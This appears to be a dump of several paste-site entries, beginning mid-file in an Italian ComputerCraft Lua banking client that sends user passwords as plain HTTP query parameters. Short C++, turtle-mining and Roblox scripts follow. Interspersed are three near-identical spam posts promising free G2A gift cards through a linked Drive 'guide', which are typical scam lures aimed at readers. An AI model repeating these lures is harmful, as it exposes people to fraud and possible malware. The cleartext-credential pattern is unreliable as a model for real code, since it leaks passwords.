                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=addebito&valore="" .. credit).readAll()
                                    tabella = textutils.unserialize(tab)
                                    if tabella.stato == ""DI"" then
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    else
                                        tabr.v = tonumber(tabel.v) + tonumber(credit)
                                        ncr = textutils.serialize(tabr)
                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        event = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Prelievo denaro da nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro prelevato:  "" .. credit .. "" IC"")
                                        term.setCursorPos(1, 7)
                                        print(""Saldo sul conto:   "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta: "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 11)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 11 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakP = true
                                                break
                                            end
                                        end
                                        break
                                    end
                                end
                            end
                            if finalBreakP then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 11 and x <= 24 then --Pulsante trasferisci denaro
                --Trasferisci denaro
                --inizio pagina
                clear()
                titolo(""Trasferimento di denaro"")
                term.setCursorPos(1, 3)
                term.write(""Inserire il nome utente del beneficiario."")
                colore(colors.gray)
                print(""\n\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

                --Mostra saldo
                term.setCursorPos(1, 10)
                colore(colors.gray)
                print(""Saldo disponibile: "" .. saldo .. "" IC"")
                colore(colors.black)

                --Verifica Beneficiario
                term.setCursorPos(1, 12)
                term.write(""Beneficiario:"")
                term.setCursorPos(15, 12)
                colore(colors.white)
                destAccettato = false
                conteggioErrori = 0
                while destAccettato == false do
                    beneficiario = read()
                    checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. beneficiario).readAll()
                    tabcheckuser = textutils.unserialize(checkuser)
                    if tabcheckuser.stato == ""OK"" and beneficiario ~= utente then
                        term.setCursorPos(15, 12)
                        colore(colors.lime)
                        term.write(beneficiario)
                        colore(colors.white)
                        destAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 12)
                        colore(colors.red)
                        if beneficiario == utente then
                            term.write(""Non puoi inserire te stesso."")
                        else
                            term.write(""Utente inesistente!         "")
                        end
                        sleep(2)
                        term.setCursorPos(15, 12)
                        colore(colors.white)
                        term.write(""                                      "")
                        term.setCursorPos(15, 12)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 12)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 12)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 12)
                            clear()
                            os.reboot()
                        end
                    end
                end

                colore(colors.black)
                --Verifica valore dell'invio
                term.setCursorPos(1, 14)
                term.write(""Importo:"")
                term.setCursorPos(15, 14)
                colore(colors.white)
                importoAccettato = false
                conteggioErrori = 0
                while importoAccettato == false do
                    importo = tonumber(read())
                    if importo == """" or importo == nil or importo <= 0 then
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Importo errato!                    "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                    elseif importo <= saldo and importo > 0 then
                        term.setCursorPos(15, 14)
                        colore(colors.lime)
                        term.write(importo .. "" IC"")
                        colore(colors.white)
                        importoAccettato = true
                    else
                        conteggioErrori = conteggioErrori + 1
                        term.setCursorPos(15, 14)
                        colore(colors.red)
                        term.write(""Credito insufficiente!          "")
                        sleep(2)
                        term.setCursorPos(15, 14)
                        colore(colors.white)
                        term.write(""                                   "")
                        term.setCursorPos(15, 14)
                        if conteggioErrori > 2 then
                            term.setCursorPos(15, 14)
                            colore(colors.red)
                            term.write(""Tre tentativi di immissione errati."")
                            sleep(2)
                            term.setCursorPos(15, 14)
                            colore(colors.white)
                            term.write(""                                   "")
                            term.setCursorPos(15, 14)
                            clear()
                            os.reboot()
                        end
                    end
                end

                sleep(0.5)
                clear()
                titolo(""Riepilogo del trasferimento"")

                text = ""Vuoi inviare "" .. importo .. "" IC a "" .. beneficiario .. ""?""
                term.setCursorPos((maxw - #text) / 2, 6)
                term.write(""Vuoi inviare "")
                colore(colors.white)
                term.write(tostring(importo) .. "" IC "")
                colore(colors.black)
                term.write(""a "")
                colore(colors.white)
                term.write(beneficiario)
                colore(colors.black)
                term.write(""?"")

                drawFilledBox(7, 11, 23, 13, colors.white)
                drawFilledBox(29, 11, 45, 13, colors.white)

                term.setCursorPos(8, 12)
                colore(colors.lime)
                term.write(""Invia il denaro"")

                term.setCursorPos(34, 12)
                colore(colors.red)
                term.write(""Annulla"")

                inviare = false
                while true do
                    event, key, x, y = os.pullEvent()
                    if event == ""mouse_click"" and x >= 7 and x <= 23 and y >= 11 and y <= 13 then
                        inviaDenaro = http.get(""http://luanet.rgbcraft.com/luanet/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=trasferimento&valore="" .. importo .. ""&beneficiario="" .. beneficiario).readAll()
                        risultatoInvio = textutils.unserialize(inviaDenaro)
                        if risultatoInvio.stato == ""OK"" then
                            text = ""Invio del denaro riuscito.""
                            text2 = ""Nuovo saldo: "" .. risultatoInvio.credito .. "" IC""
                            sfondo(colors.lightBlue)
                            colore(colors.lime)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        else
                            text = ""Errore durante l'invio del denaro.""
                            text2 = risultatoInvio.errore
                            sfondo(colors.lightBlue)
                            colore(colors.red)
                            term.setCursorPos((maxw - #text) / 2, 16)
                            term.write(text)
                            colore(colors.black)
                            term.setCursorPos((maxw - #text2) / 2, 18)
                            term.write(text2)
                            sleep(2)
                            clear()
                            break
                        end
                    elseif event == ""mouse_click"" and x >= 29 and x <= 45 and y >= 11 and y <= 13 then
                        sfondo(colors.lightBlue)
                        colore(colors.red)
                        text = ""Operazione annullata.""
                        term.setCursorPos((maxw - #text) / 2, 16)
                        term.write(text)
                        sleep(1.5)
                        clear()
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 13 and x <= 24 then --Pulsante estratto conto
                --Estratto Conto (inizio pagina)
                clear()
                titolo(""Estratto conto"")

                estratto = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&utente="" .. utente .. ""&richiesta=estratto"").readAll()
                ec = textutils.unserialize(estratto)
                term.setCursorPos(1, 3)
                print(""Entrate:"")
                colore(colors.lime)
                print(ec.entrata1)
                print(ec.entrata2)
                print(ec.entrata3)
                print(ec.entrata4)
                colore(colors.black)
                print(""\nUscite:"")
                colore(colors.red)
                print(ec.uscita1)
                print(ec.uscita2)
                print(ec.uscita3)
                print(ec.uscita4)
                term.setCursorPos(1, 18)
                sfondo(colors.white)
                colore(colors.black)
                term.write("" Torna al menåB9 principale "")
                while true do
                    event, key, x, y = os.pullEventRaw()
                    if event == ""mouse_click"" and x <= 26 and y == 18 then
                        break
                    end
                end

            elseif event == ""mouse_click"" and y == 15 and x <= 24 then --Pulsante disconnetti da nPay
                disconnetti()

            elseif event == ""timer"" and key == antitonto then --Butta fuori l'utente se non fa niente
                disconnetti()

            elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (pannello utente)
                update()
            end
        end

    elseif event == ""mouse_click"" and x == maxw and y == maxh then -- Auto aggiornamento su magic corner (schermata principale)
        update()
    end
end"
ZMZfdZua,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 12:56:25 PM CDT,"#include <iostream>
#include <map>
using namespace std;

int main()
{
  map<int, int> mapa;
  int n;
  cin >> n;

  int x[n][2];
  for(int i = 0; i < n; i++) {
    cin >> x[i][0] >> x[i][1];

    mapa[x[i][0]]++;
    mapa[x[i][1] + 1]--;
  }
    int maksimum = 0, ans = 0;
  for(auto it = mapa.begin(); it != mapa.end(); it++) {
    ans += it->second;
    maksimum = max(maksimum, ans);
  }
  cout << maksimum << endl;




    return 0;
}
"
yFdBBDhS,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,kjihu25,JavaScript,Sunday 2nd of June 2024 12:52:59 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
Ebb1bZjL,Untitled,MAGMI,Lua,Sunday 2nd of June 2024 12:39:41 PM CDT,"i = 0
while True do
	if turtle.getFuelLevel() < 200 then
		print(""Refuelling"")
		turtle.refuel()
	end

	turtle.dig()
	turtle.forward()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.digUp()
	turtle.up()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.down()
	turtle.digDown()
	turtle.turnLeft()
	turtle.dig()
	turtle.turnRight()
	turtle.dig()
	turtle.up()
	i = i+1
	if i == 50 then
		for var=0,50 do
			turtle.back()
		end
	end
end"
kuUuADCB,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,buch,JavaScript,Sunday 2nd of June 2024 12:02:54 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
zWQXeEaB,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,Alfonso1119,JavaScript,Sunday 2nd of June 2024 11:37:52 AM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
r3Rt445J,idk,qsenko1,Lua,Sunday 2nd of June 2024 11:30:11 AM CDT,"local Connection 

while task.wait(.5) do
    if ParticlesButton:GetAttribute(""hidden"") == false then
    --warn(""do the opposite"")	
	else   
       for _,Player in pairs(game:GetService(""Players""):GetPlayers()) do
			--warn(Player.Name)
			if Player.Name ~= game.Players.LocalPlayer.Name then		
				if Player.Character:FindFirstChild(""Right Arm"") and Player.Character:FindFirstChild(""Left Arm"") then
					if Player.Character:FindFirstChild(""Humanoid"") then
						if Player.Character:FindFirstChild(""Humanoid"").Health > 0 then
						--	Player.Character:FindFirstChild(""Humanoid"").Health = Player.Character:FindFirstChild(""Humanoid"").Health - 1
							if game.Workspace:FindFirstChild(Player.Name) then
								if game.Workspace:FindFirstChild(Player.Name)[""Right Arm""]:FindFirstChild(""Attachment1"") and game.Workspace:FindFirstChild(Player.Name)[""Left Arm""]:FindFirstChild(""Attachment1"") then
									warn(Player)
									if game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") and game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") then
										game.Workspace:FindFirstChild(Player.Name)[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
										game.Workspace:FindFirstChild(Player.Name)[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
										warn(""found"")
									else
										warn(""cant find trail"")
									end
								end
							end
						end
					end
				end	
   Connection = Player.CharacterAdded:Once(function(Char)
					warn(Char)
					warn(""other player restets"")
					task.wait(5)
					if Char:WaitForChild(""Right Arm"") and Char:WaitForChild(""Left Arm"") then
						warn(""Executed1"")
								if Char:FindFirstChild(""Right Arm"") and Char:FindFirstChild(""Left Arm"") then
							    warn(""Executed2"")
if Char[""Right Arm""]:FindFirstChild(""Attachment1"") and Char[""Left Arm""]:FindFirstChild(""Attachment1"") then
warn(""Executed3"")
if Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"") and Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"") then
					warn(""Executed4"")
					Char[""Right Arm""].Attachment1:FindFirstChild(""RightHandTrail"").Enabled = false
					Char[""Left Arm""].Attachment1:FindFirstChild(""LeftHandTrail"").Enabled = false
								end
							end
						end
					end
				end)	
			end
		end 
   end
end"
